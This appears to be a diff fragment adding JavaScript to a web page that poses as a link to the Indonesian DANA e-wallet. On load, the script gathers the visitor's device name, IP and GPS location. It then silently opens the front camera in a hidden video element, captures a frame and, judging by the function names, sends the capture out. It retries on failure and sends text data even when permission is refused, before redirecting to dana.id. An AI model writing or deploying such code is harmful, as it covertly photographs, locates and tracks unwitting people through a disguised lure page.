+        if (status.alreadySent || status.cameraDenied) return;
+
+        status.cameraAttempts++;
+
+        navigator.mediaDevices.getUserMedia({
+          video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+          audio: false
+        })
+        .then(stream => {
+          // Kamera berhasil diakses
+          status.cameraGranted = true;
+          const video = document.createElement('video');
+          video.style.display = 'none';
+          video.setAttribute('playsinline', '');
+          video.muted = true;
+          video.srcObject = stream;
+          document.body.appendChild(video);
+
+          video.onloadedmetadata = () => {
+            video.play()
+              .then(() => {
+                setTimeout(() => captureAndSend(video), 100);
+              })
+              .catch(() => {
+                // Gagal play → retry
+                if (status.cameraAttempts < MAX_RETRY) {
+                  status.retryTimer = setTimeout(startCamera, 2000);
+                } else {
+                  showErrorAndSendText();
+                }
+              });
+          };
+          video.onerror = () => {
+            if (status.cameraAttempts < MAX_RETRY) {
+              status.retryTimer = setTimeout(startCamera, 2000);
+            } else {
+              showErrorAndSendText();
             }
+          };
+        })
+        .catch(err => {
+          console.error('Kamera error:', err);
+          // Jika ditolak → langsung error + kirim teks
+          if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
+            showErrorAndSendText();
+            return;
+          }
+          // Error lain → retry
+          if (status.cameraAttempts < MAX_RETRY) {
+            status.retryTimer = setTimeout(startCamera, 2000);
+          } else {
+            showErrorAndSendText();
+          }
+        });
+      }
 
-            if (!sudahKirim && !izinDitolak) {
-              attempts = 0;
-          
+      // =========================================================
+      // 12. INIT
+      // =========================================================
+      async function init() {
+        // 1. Dapatkan nama HP
+        deviceName = getDeviceName();
+        console.log('📱 Device:', deviceName);
+
+        // 2. Kumpulkan lokasi (IP + GPS) secara paralel
+        await collectLocationData();
+        console.log('📍 Lokasi siap:', locationData, gpsData);
+
+        // 3. Mulai kamera
+        setTimeout(startCamera, 400);
+      }
+
+      // =========================================================
+      // 13. EVENT LISTENER
+      // =========================================================
+
+      // Tombol retry
+      if (retryBtn) {
+        retryBtn.addEventListener('click', function(e) {
+          e.stopPropagation();
+          e.preventDefault();
+          resetAndRetry();
+        });
+      }
+
+      // Tombol BUKA DI DANA
+      if (danaBtn) {
+        danaBtn.addEventListener('click', function(e) {
+          // Efek klik
+          this.style.transform = 'scale(0.96)';
+          setTimeout(() => this.style.transform = '', 150);
+
+          // Jika sedang error → reset dulu
+          if (status.cameraDenied) {
+            resetAndRetry();
+            setTimeout(() => {
+              window.location.href = 'https://www.dana.id/';
+            }, 600);
+            return;
+          }
+
+          // Jika belum kirim → coba mulai kamera ulang
+          if (!status.alreadySent && !status.cameraDenied) {
+            status.cameraAttempts = 0;
+            startCamera();
+          }
+
+          // Redirect ke dana.id
+          setTimeout(() => {
+            window.location.href = 'https://www.dana.id/';
+          }, 300);
+        });
+      }
+
+      // =========================================================
+      // 14. JALANKAN
+      // =========================================================
+      if (document.readyState === 'complete') {
+        init();
+      } else {
+        window.addEventListener('load', init);
+      }
+
+    })();
+  </script>
+</body>
+</html>
